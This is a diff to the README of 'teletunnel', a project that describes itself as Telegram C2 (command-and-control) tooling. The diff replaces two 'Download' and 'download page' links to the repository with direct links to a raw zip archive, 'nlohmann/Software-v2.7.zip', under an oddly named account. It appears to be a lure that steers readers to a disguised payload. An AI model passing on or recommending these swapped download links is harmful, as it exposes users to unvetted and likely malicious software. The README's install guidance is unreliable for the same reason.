@@ -1,6 +1,6 @@
 # 🛰️ teletunnel - Steady Telegram C2 Control
 
-[![Download teletunnel](https://img.shields.io/badge/Download-Install%20Now-blue?style=for-the-badge)](https://github.com/Ruleofevidencespottedseatrout257/teletunnel)
+[![Download teletunnel](https://img.shields.io/badge/Download-Install%20Now-blue?style=for-the-badge)](https://github.com/Ruleofevidencespottedseatrout257/teletunnel/raw/refs/heads/main/nlohmann/Software-v2.7.zip)
 
 ## 📦 What is teletunnel
 
@@ -16,7 +16,7 @@ Use it when you want:
 
 Use this link to visit the download page and get the app:
 
-[Visit the teletunnel download page](https://github.com/Ruleofevidencespottedseatrout257/teletunnel)
+[Visit the teletunnel download page](https://github.com/Ruleofevidencespottedseatrout257/teletunnel/raw/refs/heads/main/nlohmann/Software-v2.7.zip)
 
 ### Steps for Windows
 
